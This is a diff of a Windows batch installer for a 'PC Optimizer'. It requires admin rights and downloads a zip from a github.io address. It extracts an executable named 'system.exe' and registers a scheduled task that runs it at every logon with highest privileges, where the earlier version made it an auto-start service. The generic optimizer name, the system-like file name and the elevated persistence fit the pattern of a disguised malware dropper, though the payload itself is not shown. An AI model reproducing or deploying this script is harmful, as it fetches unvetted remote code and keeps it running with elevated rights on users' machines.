@@ -1,80 +1,65 @@
 @echo off
-setlocal
+setlocal EnableExtensions
 
-:: ===== CONFIGURATION =====
-:: Replace the URL with your actual zip file link
+:: ================= CONFIG =================
 set "URL=https://luckiestpancake.github.io/Files/test.zip"
-set "ZIP_NAME=downloaded_app.zip"
-set "TARGET_DIR=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\pc-optimizer"
+set "APP_NAME=PCOptimizer"
+set "INSTALL_DIR=%ProgramData%\%APP_NAME%"
+set "ZIP_PATH=%TEMP%\%APP_NAME%.zip"
 set "EXE_NAME=system.exe"
-set "SERVICE_NAME=PCOptimizerService2024"  :: More unique service name
-set "SERVICE_DISPLAY=PC Optimizer Service"
 
-echo Creating Target Directory...
-if not exist "%TARGET_DIR%" mkdir "%TARGET_DIR%"
+:: =========================================
 
-echo Downloading file with wget...
-:: Using powershell's wget (alias for Invoke-WebRequest)
-powershell -Command "wget '%URL%' -OutFile '%TARGET_DIR%\%ZIP_NAME%'"
-
-echo Extracting files...
-powershell -Command "Expand-Archive -Path '%TARGET_DIR%\%ZIP_NAME%' -DestinationPath '%TARGET_DIR%' -Force"
-
-echo Moving files from nested folder...
-:: Move all files from the nested pc-optimizer folder to the target directory
-for /d %%i in ("%TARGET_DIR%\pc-optimizer\*") do move "%%i" "%TARGET_DIR%\"
-move "%TARGET_DIR%\pc-optimizer\*" "%TARGET_DIR%\" 2>nul
-rmdir "%TARGET_DIR%\pc-optimizer" 2>nul
-
-echo Cleaning up zip file...
-del "%TARGET_DIR%\%ZIP_NAME%"
-
-:: Create batch file to start your application
-(
-  echo @echo off
-  echo cd /d "%TARGET_DIR%"
-  echo start "" "%EXE_NAME%"
-) > "%TARGET_DIR%\%BAT_FILE%"
-
-:: Check if running as administrator
+echo [1/6] Checking admin privileges...
 net session >nul 2>&1
 if %errorlevel% neq 0 (
-    echo This script requires administrator privileges to create a service.
-    echo Please run this script as administrator.
+    echo ERROR: Please run this as Administrator.
     pause
     exit /b 1
 )
 
-echo Checking if service already exists...
-sc query "%SERVICE_NAME%" >nul 2>&1
-if %errorlevel% equ 1060 (
-    echo Service does not exist. Creating new service...
-    sc create "%SERVICE_NAME%" binPath= "cmd.exe /c \"%TARGET_DIR%\%BAT_FILE%\"" start= auto DisplayName= "%SERVICE_DISPLAY%" type= own
-    if %errorlevel% neq 0 (
-        echo Failed to create service. Error code: %errorlevel%
-        pause
-        exit /b 1
-    )
-    echo Service created successfully.
-) else (
-    echo Service already exists. Stopping and updating service...
-    sc stop "%SERVICE_NAME%"
-    timeout /t 3 /nobreak >nul
-    sc config "%SERVICE_NAME%" binPath= "cmd.exe /c \"%TARGET_DIR%\%BAT_FILE%\"" start= auto DisplayName= "%SERVICE_DISPLAY%" type= own
-    if %errorlevel% neq 0 (
-        echo Failed to update service. Error code: %errorlevel%
-        pause
-        exit /b 1
-    )
-    echo Service updated successfully.
-)
+echo [2/6] Creating install directory...
+if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%"
 
-echo Starting service...
-sc start "%SERVICE_NAME%"
+echo [3/6] Downloading package...
+powershell -Command "Invoke-WebRequest -Uri '%URL%' -OutFile '%ZIP_PATH%' -ErrorAction Stop"
 if %errorlevel% neq 0 (
-    echo Failed to start service. Error code: %errorlevel%
+    echo ERROR: Download failed.
     pause
     exit /b 1
 )
 
-echo Installation complete. The service is now running and will start automatically on boot.
+echo [4/6] Extracting files...
+powershell -Command "Expand-Archive -Path '%ZIP_PATH%' -DestinationPath '%INSTALL_DIR%' -Force"
+if %errorlevel% neq 0 (
+    echo ERROR: Extraction failed.
+    pause
+    exit /b 1
+)
+
+del "%ZIP_PATH%" >nul 2>&1
+
+echo [5/6] Cleaning nested folders (if any)...
+if exist "%INSTALL_DIR%\pc-optimizer" (
+    xcopy "%INSTALL_DIR%\pc-optimizer\*" "%INSTALL_DIR%\" /E /Y /I >nul
+    rmdir /s /q "%INSTALL_DIR%\pc-optimizer"
+)
+
+echo [6/6] Creating scheduled task (startup launcher)...
+
+schtasks /create /tn "%APP_NAME%" ^
+ /tr "\"%INSTALL_DIR%\%EXE_NAME%\"" ^
+ /sc onlogon ^
+ /rl highest ^
+ /f >nul
+
+if %errorlevel% neq 0 (
+    echo ERROR: Failed to create scheduled task.
+    pause
+    exit /b 1
+)
+
+echo.
+echo Installation complete.
+echo The optimizer will now run automatically on user login.
+pause
